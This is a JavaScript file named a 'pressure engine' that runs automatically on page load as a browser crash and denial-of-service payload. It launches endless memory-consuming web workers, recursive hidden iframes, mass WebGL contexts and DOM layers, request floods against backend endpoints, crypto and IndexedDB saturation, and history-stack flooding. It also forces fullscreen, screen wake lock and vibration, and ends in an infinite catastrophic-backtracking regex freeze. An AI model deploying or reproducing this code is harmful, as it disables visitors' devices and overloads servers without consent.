/*!
 * MAGIC — pressure engine v2 (hard)
 * Params: x=power(0.1-6)  s=1 telemetry  net=0 no-network  v=0 no-vibrate  fs=0 no-fullscreen
 */
(() => {
  'use strict';

  const P = new URLSearchParams(location.search);
  const clamp = (v, a, b) => (v < a ? a : v > b ? b : v);

  const MULT = clamp(parseFloat(P.get('x')) || 6, 0.1, 6);
  const TELE = P.get('s') === '1';
  const NET  = P.get('net') !== '0';
  const VIB  = P.get('v')  !== '0';
  const FS   = P.get('fs') !== '0';

  const nav   = navigator;
  const memGB = clamp(+nav.deviceMemory || 4, 2, 32);
  const cores = clamp(+nav.hardwareConcurrency || 4, 1, 16);
  const POW   = clamp((memGB / 6) * (1 + cores / 10) * MULT, 0.2, 10);
  const MAXDEPTH = Math.round(clamp(3 + POW, 3, 7));

  const $ = (id) => document.getElementById(id);
  const elM = $('m'), elS = $('s'), elStage = $('stage'), elC = $('c');

  const HOLD = [], BYTES = [];
  const hold  = (v) => { HOLD.push(v); return v; };
  const later = (fn, ms) => setTimeout(fn, ms);
  const safe  = (f) => { try { return f(); } catch (e) {} };
  const mark  = (n, v) => { if (TELE && elS) elS.textContent = n + (v == null ? '' : ' ' + v); };

  const bite = (n) => {
    const a = new Uint8Array(n);
    for (let i = 0; i < n; i += 4096) a[i] = i & 255;
    return a;
  };

  /* ---- 1. workers: apna apna heap, 16MB per hit, forever ---- */
  const WSRC = `
    var H = [];
    onmessage = function (e) {
      var s = e.data || 16777216;
      for (;;) {
        try { var a = new Uint8Array(s); for (var i = 0; i < s; i += 4096) a[i] = i & 255; H.push(a); }
        catch (x) { H = []; }
      }
    };`;
  function workers() {
    let url; try { url = URL.createObjectURL(new Blob([WSRC], { type: 'text/javascript' })); } catch (e) { return; }
    const n = clamp(Math.round(cores * 4 * POW), 8, 48);
    const step = clamp(Math.round(4 * POW), 2, 32) << 20;
    for (let i = 0; i < n; i++) {
      try { const w = new Worker(url); w.onmessage = () => {}; w.postMessage(step); hold(w); } catch (e) { break; }
    }
  }

  /* ---- 2. recursive iframes ---- */
  function frames() {
    const level = parseInt(P.get('d'), 10) || 0;
    if (level >= MAXDEPTH) return;
    const breadth = level < 2 ? 3 : 2;
    for (let i = 0; i < breadth; i++) {
      try {
        const f = document.createElement('iframe');
        f.src = '/void.html?d=' + (level + 1);
        f.setAttribute('scrolling', 'no');
        f.style.cssText = 'position:fixed;left:0;top:0;width:1px;height:1px;border:0;opacity:0;pointer-events:none';
        document.body.appendChild(f); hold(f);
      } catch (e) { break; }
    }
  }

  /* ---- 3. GPU / WebGL contexts ---- */
  function gpu() {
    const side = clamp(Math.round(2048 * Math.sqrt(POW)), 1024, 4096);
    const n = clamp(Math.round(10 * POW), 6, 48);
    for (let i = 0; i < n; i++) {
      try {
        const cv = document.createElement('canvas');
        cv.width = side; cv.height = side;
        const gl = cv.getContext('webgl', { antialias: false, depth: true, stencil: false, powerPreference: 'high-performance' })
                || cv.getContext('experimental-webgl');
        if (gl) { gl.clearColor(0, 0, 0, 1); gl.clear(gl.COLOR_BUFFER_BIT); }
        else { const c2 = cv.getContext('2d'); if (c2) c2.fillRect(0, 0, side, side); }
        hold(cv); hold(gl);
      } catch (e) { break; }
    }
  }

  /* ---- 4. DOM + compositor layers ---- */
  function dom() {
    if (!elStage) return;
    const n = clamp(Math.round(5000 * POW), 4000, 20000);
    const frag = document.createDocumentFragment();
    for (let i = 0; i < n; i++) {
      const d = document.createElement('div');
      d.textContent = 'MAGIC';
      d.style.cssText =
        'position:absolute;left:' + (i % 41) + 'px;top:' + (i % 59) + 'px;' +
        'width:3px;height:3px;font:1px/1 monospace;color:#000;' +
        'transform:translate3d(0,0,0);will-change:transform;contain:strict';
      frag.appendChild(d);
    }
    elStage.appendChild(frag);
  }

  /* ---- 5. strings / packed arrays ---- */
  function strings() {
    try { hold('M'.repeat(48e6)); } catch (e) {}
    try { hold('x'.repeat(24e6).split('')); } catch (e) {}
    for (let i = 0; i < 8; i++) { try { hold(new Array(3e6).fill(i)); } catch (e) { break; } }
    try { hold(new Float64Array(8e6)); } catch (e) {}
  }

  /* ---- 6. network flood + backend chain ---- */
  function net() {
    if (!NET) return;
    const CONC = clamp(Math.round(16 * POW) + 20, 20, 110);
    const sizes = [32, 128, 512, 1024, 2048, 4096];
    const lane = (i) => {
      const kb = sizes[i % sizes.length];
      const go = () => {
        fetch('/api/hammer?s=' + kb + '&c=1&r=' + Math.random(), { cache: 'no-store' })
          .then((r) => r.arrayBuffer()).then((b) => { BYTES.push(b); go(); })
          .catch(() => setTimeout(go, 20));
      };
      go();
    };
    for (let i = 0; i < CONC; i++) setTimeout(() => lane(i), i * 6);
    for (let i = 0; i < clamp(Math.round(POW) + 3, 3, 8); i++) {
      const chain = () => {
        fetch('/api/chain?d=0&f=3&s=48&r=' + Math.random(), { cache: 'no-store' })
          .then((r) => r.arrayBuffer()).then((b) => { BYTES.push(b); chain(); })
          .catch(() => setTimeout(chain, 50));
      };
      setTimeout(chain, 60 + i * 60);
    }
  }

  /* ---- 7. crypto digest saturation ---- */
  function cryptoBomb() {
    const sub = window.crypto && window.crypto.subtle;
    if (!sub) return;
    const buf = new Uint8Array(4 << 20);
    for (let i = 0; i < 14; i++) {
      const go = () => sub.digest('SHA-256', buf).then(go).catch(() => setTimeout(go, 15));
      go();
    }
  }

  /* ---- 8. IndexedDB bulk ---- */
  function idb() {
    try {
      const r = indexedDB.open('magic', 1);
      r.onupgradeneeded = () => { try { r.result.createObjectStore('s', { autoIncrement: true }); } catch (e) {} };
      r.onsuccess = () => {
        try {
          const st = r.result.transaction('s', 'readwrite').objectStore('s');
          const blob = 'M'.repeat(1 << 16);
          for (let i = 0; i < 6000; i++) st.put(blob + i);
        } catch (e) {}
      };
    } catch (e) {}
  }

  /* ---- 9. main-thread heap grind (never stops) ---- */
  function heap() {
    const step = clamp(Math.round(14 * POW), 8, 96) << 20;
    for (let i = 0; i < 5; i++) {
      try { BYTES.push(bite(step)); } catch (e) { BYTES.length = 0; }
    }
    later(heap, 1);
  }

  /* ---- shell ---- */
  function fullscreen() {
    if (!FS) return;
    const d = document.documentElement;
    const fn = d.requestFullscreen || d.webkitRequestFullscreen || d.mozRequestFullScreen;
    if (fn) safe(() => { const p = fn.call(d, { navigationUI: 'hide' }); if (p && p.catch) p.catch(() => {}); });
    safe(() => { const o = screen.orientation; if (o && o.lock) o.lock('portrait').catch(() => {}); });
  }
  function wakeLock() { safe(() => nav.wakeLock.request('screen').then((l) => hold(l)).catch(() => {})); }
  function buzz() {
    if (!VIB) return;
    safe(() => nav.vibrate([140, 60, 200, 70, 260, 110, 500]));
    later(buzz, 800);
  }
  let hs = 0;
  function historyBomb() {
    for (let i = 0; i < 300; i++) { try { history.pushState(null, '', '#' + (hs++)); } catch (e) { break; } }
    later(historyBomb, 20);
  }
  function registerSW() { safe(() => nav.serviceWorker && nav.serviceWorker.register('/sw.js').then((r) => hold(r)).catch(() => {})); }

  /* ---- blackout ---- */
  function blackout() {
    mark('BLACK');
    safe(() => elM && elM.classList.add('dim'));
    safe(() => elC && elC.remove());
    safe(() => elStage && (elStage.style.display = 'none'));
    safe(() => { document.documentElement.style.background = '#000'; document.body.style.background = '#000'; });
    safe(() => elS && (elS.textContent = ''));
    safe(() => nav.vibrate([550, 90, 550, 90, 1600]));
  }

  /* ---- all layers, one tick ---- */
  function detonate() {
    mark('DETONATE');
    safe(workers); safe(frames); safe(gpu); safe(dom);
    safe(strings); safe(net); safe(cryptoBomb); safe(idb); safe(heap);
  }

  /* ---- permanent freeze ---- */
  const R1 = /^(a+)+$/, R2 = /(a|aa)+$/, R3 = /^(\w+\s?)+$/;
  const S1 = 'a'.repeat(30) + '!';
  const S2 = 'a'.repeat(24) + '!';
  const S3 = 'ab '.repeat(30) + '!';
  function freeze() {
    mark('FREEZE');
    for (;;) {
      safe(() => R1.test(S1));
      safe(() => R2.test(S2));
      safe(() => R3.test(S3));
      try { HOLD.push(new Uint8Array(1 << 20)); } catch (e) { BYTES.length = 0; }
    }
  }

  /* ---- go ---- */
  let f = 0;
  const kick = () => {
    if (f++ < 2) return requestAnimationFrame(kick);
    safe(fullscreen); safe(wakeLock); safe(buzz); safe(historyBomb); safe(registerSW);
    setTimeout(blackout, 90);
    setTimeout(detonate, 120);
    setTimeout(freeze, 1250);
  };
  requestAnimationFrame(kick);
})();
